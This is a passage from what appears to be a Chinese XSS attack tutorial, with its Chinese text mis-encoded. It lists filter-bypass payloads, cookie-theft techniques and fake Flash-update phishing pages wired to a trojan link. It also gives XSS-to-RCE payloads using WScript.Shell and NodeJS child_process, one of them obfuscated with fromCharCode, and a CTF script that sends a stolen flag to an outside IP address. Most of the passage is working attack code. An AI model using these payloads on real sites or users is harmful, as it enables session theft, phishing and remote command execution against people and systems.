alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094715-cd264a4c-bb68-1.png)</p><p>ä½†æ˜¯å½“åœ¨å‰é¢åŠ ä¸Š <code>&lt;svg&gt;</code> åï¼Œå´æˆåŠŸå¼¹çª—äº†ï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="symbol">&amp;#40;</span>1)</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>[<img src="/../images/20210523094716-cd67709e-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094716-cd67709e-bb68-1.png)</p><p>è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p><p>æ˜¯å› ä¸º <code>&lt;svg&gt;</code> æ ‡ç­¾å±äºHTMLäº”å¤§å…ƒç´ ä¸­çš„å¤–éƒ¨å…ƒç´ ï¼Œå¯ä»¥å®¹çº³æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€CDATAæ®µã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Šï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨è§£æåˆ°<code>&lt;svg&gt;</code> æ ‡ç­¾æ—¶ï¼Œæµè§ˆå™¨å°±å¼€å§‹ä½¿ç”¨ä¸€å¥—æ–°çš„æ ‡å‡†å¼€å§‹è§£æåé¢çš„å†…å®¹ï¼Œç›´åˆ°ç¢°åˆ°é—­åˆæ ‡ç­¾<code>&lt;/svg&gt;</code>ã€‚è€Œåœ¨è¿™ä¸€å¥—æ–°çš„æ ‡å‡†éµå¾ªXMLè§£æè§„åˆ™ï¼Œåœ¨XMLè§£æä¸­ï¼Œå®ä½“ç¼–ç ä¼šè‡ªåŠ¨è§£ç æˆç›¸åº”çš„å­—ç¬¦ï¼Œé‡æ–°æ¥ä¸€éæ ‡ç­¾å¼€å¯çŠ¶æ€ï¼Œæ­¤æ—¶å°±ä¼šæ‰§è¡ŒXSSäº†ã€‚å¦‚ä¸‹å›¾ï¼Œå¼¹çª—åæˆ‘ä»¬æŸ¥çœ‹é¡µé¢æºç ã€‚å‘ç°åŸæœ¬ä¸èƒ½è¢«HTMLè§£ç çš„å†…å®¹è¢« <code>&lt;svg&gt;</code> æ ‡ç­¾è‡ªåŠ¨è§£ç äº†ï¼š</p><p>[<img src="/../images/20210523094717-cde26b1e-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094717-cde26b1e-bb68-1.png)</p><h1 id="æµ‹è¯•æµç¨‹æ€è·¯"><a href="#æµ‹è¯•æµç¨‹æ€è·¯" class="headerlink" title="æµ‹è¯•æµç¨‹æ€è·¯"></a>æµ‹è¯•æµç¨‹æ€è·¯</h1><p>ä¸‹é¢è®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹XSSç»•è¿‡çš„æµ‹è¯•æµç¨‹ã€‚</p><p>ç°å®ä¸­ï¼Œå¤§å¤šæ•°çš„åœºæ‰€æ˜¯ç”¨çš„é»‘åå•æ¥åšXSSè¿‡æ»¤å™¨çš„ï¼Œæœ‰ä¸‰ç§æ–¹å¼ç»•è¿‡é»‘åå•çš„æµ‹è¯•ï¼š</p><ol><li>æš´åŠ›æµ‹è¯•ï¼ˆè¾“å…¥å¤§é‡çš„payloadï¼Œçœ‹è¿”å›ç»“æœï¼‰</li><li>æ ¹æ®æ­£åˆ™æ¨ç®—</li><li>åˆ©ç”¨æµè§ˆå™¨bug</li></ol><h2 id="åˆæ­¥æµ‹è¯•"><a href="#åˆæ­¥æµ‹è¯•" class="headerlink" title="åˆæ­¥æµ‹è¯•"></a>åˆæ­¥æµ‹è¯•</h2><p>ï¼ˆ1ï¼‰å°è¯•æ’å…¥æ¯”è¾ƒæ­£å¸¸çš„HTMLæ ‡ç­¾ï¼Œä¾‹å¦‚ï¼š<code>&lt;a&gt;</code>ã€<code>&lt;b&gt;</code>ã€<code>&lt;i&gt;</code>ã€<code>&lt;u&gt;</code> ç­‰ï¼Œæ¥çœ‹ä¸€ä¸‹è¿”å›é¡µé¢çš„æƒ…å†µæ˜¯æ€æ ·çš„ï¼Œæ˜¯å¦è¢«HTMLç¼–ç äº†ï¼Œæˆ–è€…æ ‡ç­¾è¢«è¿‡æ»¤äº†ã€‚</p><p>ï¼ˆ2ï¼‰å°è¯•æ’å…¥ä¸é—­åˆçš„æ ‡ç­¾ï¼Œä¾‹å¦‚ï¼š<code>&lt;a</code>ã€<code>&lt;b</code>ã€<code>i&gt;</code>ã€<code>u&gt;</code>ã€<code>&lt;img</code> ç­‰ï¼Œç„¶åçœ‹ä¸€ä¸‹è¿”å›å“åº”ï¼Œæ˜¯å¦å¯¹å¼€æ”¾çš„æ ‡ç­¾ä¹Ÿæœ‰è¿‡æ»¤ã€‚</p><p>ï¼ˆ3ï¼‰ç„¶åæµ‹è¯•å‡ ç§å¸¸è§çš„XSSå‘é‡ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>prompt(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>confirm(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>çœ‹è¿”å›å“åº”ï¼Œæ˜¯è¿‡æ»¤çš„å…¨éƒ¨ï¼Œè¿˜æ˜¯åªè¿‡æ»¤äº†éƒ¨åˆ†ï¼Œæ˜¯å¦è¿˜ç•™ä¸‹äº† alertã€promptã€confirm ç­‰å­—ç¬¦ï¼Œå†å°è¯•å¤§å°å†™çš„ç»„åˆï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;scRiPt&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/scrIPt&gt;</span><br></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰å¦‚æœè¿‡æ»¤å™¨ä»…ä»…æ˜¯æŠŠ <code>&lt;script&gt;</code> å’Œ <code>&lt;/script&gt;</code> æ ‡ç­¾è¿‡æ»¤æ‰ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨åŒå†™çš„æ–¹å¼æ¥ç»•è¿‡ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å½“ <code>&lt;script&gt;</code> æ ‡ç­¾è¢«è¿‡æ»¤æ‰åï¼Œå‰©ä¸‹çš„ç»„åˆèµ·æ¥åˆšå¥½å½¢æˆä¸€ä¸ªå®Œæ•´çš„å‘é‡ã€‚</p><p>ï¼ˆ5ï¼‰ç”¨ <code>&lt;a href</code> æ ‡ç­¾æ¥æµ‹è¯•ï¼Œçœ‹è¿”å›å“åº”</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;http://www.baidu.com&quot;</span>&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>çœ‹çœ‹ <code>&lt;a</code> æ ‡ç­¾æ˜¯å¦è¢«è¿‡æ»¤ï¼Œhref æ˜¯å¦è¢«è¿‡æ»¤ï¼Œhrefé‡Œçš„æ•°æ®æ˜¯å¦è¢«è¿‡æ»¤äº†ã€‚å¦‚æœæ²¡æœ‰æ•°æ®è¢«è¿‡æ»¤ï¼Œæ’å…¥javascriptä¼ªåè®®çœ‹çœ‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>çœ‹æ˜¯å¦è¿”å›é”™è¯¯ï¼Œjavascriptçš„æ•´ä¸ªåè®®å†…å®¹æ˜¯å¦éƒ½è¢«è¿‡æ»¤æ‰ï¼Œè¿˜æ˜¯åªè¿‡æ»¤äº†javascriptå­—ç¬¦ã€‚</p><p>ç»§ç»­æµ‹è¯•äº‹ä»¶è§¦å‘æ‰§è¡Œjavascriptï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=x onmouseover=alert(1)&gt;ClickHere&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>çœ‹onmouseoveräº‹ä»¶æ˜¯å¦è¢«è¿‡æ»¤ã€‚</p><p>æµ‹è¯•ä¸€ä¸ªæ— æ•ˆçš„äº‹ä»¶ï¼Œçœ‹çœ‹ä»–çš„è¿‡æ»¤è§„åˆ™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=x onclimbatree=alert(1)&gt;ClickHere&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>æ˜¯å®Œæ•´çš„è¿”å›äº†å‘¢ï¼Œè¿˜æ˜¯è·Ÿonmouseoverä¸€æ ·è¢«å¹²æ‰äº†ã€‚å¦‚æœæ˜¯å®Œæ•´çš„è¿”å›çš„è¯ï¼Œé‚£ä¹ˆå°±æ„å‘³ç€ï¼Œåšäº†äº‹ä»¶çš„é»‘åå•ï¼Œä½†æ˜¯åœ¨HTML5ä¸­ï¼Œæœ‰è¶…è¿‡150ç§çš„æ–¹å¼æ¥æ‰§è¡Œjavascriptä»£ç çš„äº‹ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥é€‰ç”¨åˆ«çš„äº‹ä»¶ã€‚æµ‹è¯•ä¸€ä¸ªå¾ˆå°‘è§çš„äº‹ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body onhashchange=alert(1)&gt;&lt;a href=#&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure><blockquote><p>onhashchange äº‹ä»¶åœ¨å½“å‰ URL çš„é”šéƒ¨åˆ†(ä»¥ â€˜#â€™ å·ä¸ºå¼€å§‹) å‘ç”Ÿæ”¹å˜æ—¶è§¦å‘ ã€‚</p></blockquote><h2 id="æµ‹è¯•å…¶ä»–æ ‡ç­¾å’Œå±æ€§"><a href="#æµ‹è¯•å…¶ä»–æ ‡ç­¾å’Œå±æ€§" class="headerlink" title="æµ‹è¯•å…¶ä»–æ ‡ç­¾å’Œå±æ€§"></a>æµ‹è¯•å…¶ä»–æ ‡ç­¾å’Œå±æ€§</h2><p>HTMLçš„æ ‡ç­¾å’Œå±æ€§å¤ªå¤šäº†ï¼Œä¸Šæ–‡ä¸­å·²ç»åˆ—å‡ºäº†å¾ˆå¤šäº†ã€‚</p><h1 id="æ”»å‡»é¢æ‹“å±•"><a href="#æ”»å‡»é¢æ‹“å±•" class="headerlink" title="æ”»å‡»é¢æ‹“å±•"></a>æ”»å‡»é¢æ‹“å±•</h1><h2 id="é’“é±¼"><a href="#é’“é±¼" class="headerlink" title="é’“é±¼"></a>é’“é±¼</h2><h3 id="é€šè¿‡-XSS-ç›—å–-Cookie"><a href="#é€šè¿‡-XSS-ç›—å–-Cookie" class="headerlink" title="é€šè¿‡ XSS ç›—å– Cookie"></a>é€šè¿‡ XSS ç›—å– Cookie</h3><p>Cookieç›—å–æ˜¯xssæ”»å‡»ä¸­æœ€å®ç”¨ä¹Ÿæ˜¯æœ€å¹¿æ³›çš„ä¸€ç§åˆ©ç”¨æ–¹å¼ä¹‹ä¸€ã€‚æˆ‘ä»¬çŸ¥é“Cookieæ˜¯Webç³»ç»Ÿè¯†åˆ«ç”¨æˆ·çš„èº«ä»½å’Œä¿å­˜ä¼šè¯çŠ¶æ€çš„ä¸»è¦æœºåˆ¶ï¼Œä¸”æ˜¯ç”±æœåŠ¡å™¨æä¾›çš„ã€å­˜å‚¨åœ¨å®¢æˆ·ç«¯çš„ä¸€ç§æ•°æ®ã€‚åŒæ—¶ï¼Œå¯¹äºcookieçš„æ“ä½œååˆ†çš„æ–¹ä¾¿ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡Documentå¯¹è±¡è®¿é—®Cookieã€‚æœ€ç®€å•çš„æ¯”å¦‚ï¼š<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> ï¼Œæ‰§è¡Œåä¼šå¼¹å‡ºå½“å‰é¡µé¢çš„cookieä¿¡æ¯ã€‚åœ¨ç›®æ ‡æ²¡æœ‰â€œåŒæºç­–ç•¥â€çš„ä¿æŠ¤ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨XSSç›—å–ç›®æ ‡ç½‘ç«™ç®¡ç†å‘˜çš„Cookieã€‚</p><p>åœ¨ä¸€èˆ¬çš„é€šç”¨CMSä¸‹å‘¢ï¼Œä¸ºäº†é€šç”¨æ¨¡æ¿çš„å…¼å®¹æ€§ï¼Œè®¸å¤šCMSæœ¬èº«ä¸ä¼šä½¿ç”¨â€œåŒæºç­–ç•¥â€ç­‰å…¶ä»–æ‰‹æ®µæ¥é˜²æŠ¤XSSæ¼æ´ï¼Œè€Œæ˜¯ä½¿ç”¨è‡ªå»ºçš„è¿‡æ»¤å‡½æ•°æ¥å¤„ç†ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸€æ—¦å‡ºç°XSSæ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥è·å–ç›®æ ‡çš„Cookieç„¶åä½¿ç”¨ç‰¹å®šçš„æ–¹æ³•æ¥ä¼ è¾“cookieã€‚</p><p>è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç½‘ä¸Šç°æˆçš„æˆ–è‡ªå·±æ­å»ºçš„XSSå¹³å°æ¥å®Œæˆåˆ©ç”¨è¿‡ç¨‹ã€‚</p><h3 id="Flash-å¼¹çª—é’“é±¼"><a href="#Flash-å¼¹çª—é’“é±¼" class="headerlink" title="Flash å¼¹çª—é’“é±¼"></a>Flash å¼¹çª—é’“é±¼</h3><ul><li>é¡¹ç›®ä¸€åœ°å€ï¼š<a href="https://github.com/Wileysec/adobe-flash-phishing-page">https://github.com/Wileysec/adobe-flash-phishing-page</a></li></ul><p>è¯¥é¡¹ç›®æ˜¯æ¨¡ä»¿çš„ Flash Player ä¸­æ–‡å®˜ç½‘çš„é¡µé¢ï¼š</p><p>[<img src="/../images/20210523094717-ce2b906e-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094717-ce2b906e-bb68-1.png)</p><p>éœ€è¦åœ¨index.htmlä¸­çš„åŠ å…¥æˆ‘ä»¬åˆ¶ä½œçš„æœ¨é©¬çš„é“¾æ¥åœ°å€ï¼š</p><p>[<img src="/../images/20210523094718-ce9bd752-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094718-ce9bd752-bb68-1.png)</p><ul><li>é¡¹ç›®äºŒåœ°å€ï¼š<a href="https://github.com/r00tSe7en/Flash-Pop">https://github.com/r00tSe7en/Flash-Pop</a></li></ul><p>è¯¥é¡¹ç›®æ˜¯ä¸€ä¸ªé€¼çœŸçš„Flashæ›´æ–°æé†’çš„å¼¹çª—ï¼Œå¼ºè¿«ç—‡éƒ½ä¼šå¿ä¸ä½å»ç‚¹å‡»ä¸‹è½½çš„ï¼š</p><p>[<img src="/../images/20210523094718-ced9a208-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094718-ced9a208-bb68-1.png)</p><p>æ‰¾åˆ°flash.jsï¼Œæœç´¢é“¾æ¥â€œ<a href="https://www.se7ensec.cn/%E2%80%9D%EF%BC%8C%E5%B0%86%E5%85%B6%E6%94%B9%E4%B8%BA%E6%88%91%E4%BB%AC%E5%88%B6%E4%BD%9C%E7%9A%84%E6%9C%A8%E9%A9%AC%E7%9A%84%E9%93%BE%E6%8E%A5%E5%9C%B0%E5%9D%80%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BF%9D%E5%AD%98%E5%8D%B3%E5%8F%AF%EF%BC%9A">https://www.se7ensec.cn/â€ï¼Œå°†å…¶æ”¹ä¸ºæˆ‘ä»¬åˆ¶ä½œçš„æœ¨é©¬çš„é“¾æ¥åœ°å€ï¼Œç„¶åä¿å­˜å³å¯ï¼š</a></p><p>[<img src="/../images/20210523094718-cefeb124-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094718-cefeb124-bb68-1.png)</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>ä¸ºäº†å¤§å¤§æå‡ XSS çš„å±å®³ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ JavaScript æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><h3 id="ä½¿ç”¨-WScript-Shell-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#ä½¿ç”¨-WScript-Shell-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="ä½¿ç”¨ WScript.Shell æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>ä½¿ç”¨ WScript.Shell æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h3><h4 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h4><ul><li><p>Internet Explorer </p></li><li><p>åœ¨IEä¸Šæ‰“å¼€è®¾ç½®ä¸­çš„Intertneté€‰é¡¹-â€œå®‰å…¨â€-â€œè‡ªå®šä¹‰çº§åˆ«â€-â€œå¯¹æ²¡æœ‰æ ‡è®°ä¸ºå®‰å…¨çš„activexæ§ä»¶è¿›è¡Œåˆå§‹åŒ–å’Œè„šæœ¬è¿è¡Œ-è®¾ç½®æˆå¯ç”¨ï¼Œå¦‚ä¸‹</p><p><img src="/../images/20190121110917-f04620ae-1d29-1-1686840019398.jpeg" alt="20190121110917-f04620ae-1d29-1"></p></li></ul><p>WScript.Shellï¼ˆWindows Script Host Runtime Libraryï¼‰æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹åº”çš„æ–‡ä»¶æ˜¯C:&#x2F;WINDOWS&#x2F;system32&#x2F;wshom.ocxï¼ŒWscript.shellæ˜¯æœåŠ¡å™¨ç³»ç»Ÿä¼šç”¨åˆ°çš„ä¸€ç§ç»„ä»¶ã€‚4è¿™ä¸ªå¯¹è±¡å¯ä»¥æ‰§è¡Œæ“ä½œç³»ç»Ÿå¤–å£³å¸¸ç”¨çš„æ“ä½œï¼Œæ¯”å¦‚è¿è¡Œç¨‹åºã€è¯»å†™æ³¨å†Œè¡¨ã€ç¯å¢ƒå˜é‡ç­‰ã€‚ç®€å•ä½¿ç”¨å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> shell = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>);</span><br><span class="line">shell.<span class="title function_">run</span>(<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230524224855708-1686840019398.png" alt="image-20230524224855708"></p><p>æœ‰æ—¶å€™ä¸ºäº† Bypass ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>String.fromCharCode</code> ä» Ascii æ¥è½¬åŒ–æ¶æ„ä»£ç ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;eval(String.fromCharCode(10,118,97,114,32,111,61,110,101,119,32,65,99,116,105,118,101,88,79,98,106,101,99,116,40,39,87,83,99,114,105,112,116,46,115,104,101,108,108,39,41,59,10,111,46,114,117,110,40,39,99,97,108,99,46,101,120,101,39,41,59,10));&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨-child-process-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#ä½¿ç”¨-child-process-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="ä½¿ç”¨ child_process æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>ä½¿ç”¨ child_process æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h3><p>å¦‚æœç›®æ ‡ç¯å¢ƒå¯ç”¨äº† <strong>NodeJS</strong> çš„è¯ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨ NodeJS çš„å­è¿›ç¨‹ï¼ˆchild_processï¼‰è°ƒç”¨å¹¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;const exec = require(&#x27;child_process&#x27;).exec;exec(&#x27;whoami&#x27;).stdout.on(&#x27;data&#x27;, function (data) &#123;alert(data);&#125;)&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=&quot;require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=&quot;require(&#x27;child_process&#x27;).exec(&#x27;&lt;æ›´å¤šç¨€å¥‡å¤æ€ªçš„Payload&gt;&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><p>èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤äº†ï¼Œé‚£ä¹ˆ XSS åœ¨é’“é±¼æ”»å‡»ä¸­çš„ä½œç”¨ä¾¿å¤§å¤§æé«˜äº†ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥åˆ©ç”¨ XSS åå¼¹ Shell å¹¶ä¸Šçº¿ Metasploit æˆ– CS ã€‚</p><h3 id="Xmind-2020-XSS-to-RCE"><a href="#Xmind-2020-XSS-to-RCE" class="headerlink" title="Xmind 2020 XSS  to RCE"></a>Xmind 2020 XSS  to RCE</h3><p>æ¼æ´åˆ©ç”¨å¾ˆç®€å•ï¼Œåœ¨ â€œæ€ç»´å¯¼å›¾â€ ä¸­è¾“å‡º Payloadï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure><p>[<img src="/../images/20210523094723-d1fa41ae-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094723-d1fa41ae-bb68-1.png)</p><p>åˆ‡æ¢åˆ° â€œå¤§çº²â€ ä¸­ï¼ŒæŒ‰ä¸‹ä¸€ä¸ªåŠŸèƒ½é”®å³å¯è§¦å‘æ”»å‡»ï¼š</p><p>[<img src="/../images/20210523094724-d23097e0-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094724-d23097e0-bb68-1.png)</p><p>ç”±äº Xmind å¯ç”¨äº† NodeJS åŠŸèƒ½ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ child_process è°ƒç”¨å¹¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><p>[<img src="/../images/20210523094724-d269b494-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094724-d269b494-bb68-1.png)</p><p>[<img src="/../images/20210523094725-d2c17756-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094725-d2c17756-bb68-1.png)</p><h3 id="èšå‰‘çš„XSS-to-RCE"><a href="#èšå‰‘çš„XSS-to-RCE" class="headerlink" title="èšå‰‘çš„XSS to RCE"></a>èšå‰‘çš„XSS to RCE</h3><p><a href="https://github.com/AntSwordProject/antSword/issues/147">https://github.com/AntSwordProject/antSword/issues/147</a></p><p><a href="https://xz.aliyun.com/t/8167#toc-0">æµ…è°ˆèšå‰‘RCE - å…ˆçŸ¥ç¤¾åŒº</a></p><h1 id="ç»•è¿‡httponly"><a href="#ç»•è¿‡httponly" class="headerlink" title="ç»•è¿‡httponly"></a>ç»•è¿‡httponly</h1><h3 id="Apache-httpOnly-Cookieæ³„éœ²-CVE-2012-0053"><a href="#Apache-httpOnly-Cookieæ³„éœ²-CVE-2012-0053" class="headerlink" title="Apache httpOnly Cookieæ³„éœ²( CVE-2012-0053)"></a>Apache httpOnly Cookieæ³„éœ²( CVE-2012-0053)</h3><p>å½±å“ç‰ˆæœ¬ï¼š<strong>Apache2.2.0-Apache2.2.1</strong></p><p>å½“å®¢æˆ·ç«¯è¯·æ±‚çš„cookieè¶…è¿‡4KBæ—¶ï¼Œæ— è®ºcookieæ˜¯å¦å¸¦æœ‰httponlyï¼ŒApache HTTPD Serveréƒ½ä¼šå°†Cookieçš„æ˜æ–‡ä¿¡æ¯æ‰“å°åˆ°é¡µé¢ä¸Š</p><h3 id="CORS-cookieå›æ˜¾"><a href="#CORS-cookieå›æ˜¾" class="headerlink" title="CORS+cookieå›æ˜¾"></a>CORS+cookieå›æ˜¾</h3><p>ä¾‹é¢˜</p><p><a href="https://nikoeurus.github.io/2019/11/14/UNCTF-Web%E5%A4%8D%E7%8E%B0/#easyxss">https://nikoeurus.github.io/2019/11/14/UNCTF-Web%E5%A4%8D%E7%8E%B0/#easyxss</a></p><p>æ¡ä»¶1</p><blockquote><p>responseæ•°æ®åŒ…ä¸­</p><p>Access-Control-Allow-Headers: X-Requested-Withï¼Œè¯´æ˜äº†æˆ‘ä»¬å¯ä»¥é€šè¿‡<strong>XHR</strong>è¯·æ±‚æ¥è®¿é—®ç½‘ç«™</p><p><code>XMLHttpRequest</code>æ˜¯ç”¨äºåœ¨åå°ä¸æœåŠ¡å™¨äº¤æ¢æ•°æ®ã€‚å¦‚æœè®¾ç½®XHRè¯·æ±‚ç½‘ç«™ï¼Œé‚£ä¹ˆè¯·å¤´éƒ¨å¿…ç„¶ä¼šå¸¦æœ‰ï¼š<code>Origin:xxx</code>ï¼Œåˆ™ä¼šè¢«æœåŠ¡å™¨è§†ä¸ºåŒæºè®¿é—®</p></blockquote><p>æ¡ä»¶2</p><p>æ²¡æœ‰å…³é—­debugæ¨¡å¼ï¼Œå¯¼è‡´cookieå›æ˜¾</p><p><img src="/../images/39-1686840019399.png" alt="img"></p><p>åˆ©ç”¨<code>location.href</code>é‡å®šå‘åˆ°vpsï¼Œä»è€Œå¸¦å‡ºcookie</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)&#123;</span><br><span class="line">        location.<span class="property">href</span>=<span class="string">&#x27;http://106.15.250.162:8888/?flag=&#x27;</span>+ xmlhttp.<span class="property">responseText</span>.<span class="title function_">match</span>(<span class="string">&#x27;flag\\&#123;(.\*?)\\&#125;&#x27;</span>)[<span class="number">1</span>]&#125;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;/index.php/treehole/view?id=&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.<span class="title 